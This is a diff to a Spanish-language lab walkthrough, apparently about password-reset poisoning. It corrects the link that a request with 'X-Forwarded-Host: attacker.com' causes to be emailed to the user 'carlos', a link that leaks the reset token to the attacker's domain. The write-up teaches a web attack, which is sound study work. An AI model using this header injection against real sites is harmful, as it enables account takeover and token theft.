@@ -209,7 +209,7 @@ X-Forwarded-Host: attacker.com
 username=carlos
 ```
 
-Le llegará un correo a carlos con el enlace: `http://attacker.com/temp-forgot-password-token=2lk5twrzvex9c1bv9wyvi3vuhgh6rdhi`.
+Le llegará un correo a carlos con el enlace: `http://attacker.com/forgot-password?temp-forgot-password-token=2lk5twrzvex9c1bv9wyvi3vuhgh6rdhi`.
 
 Al clickar, hará una petición al dominio del atacante revelando el token para cambiar la contraseña.
 
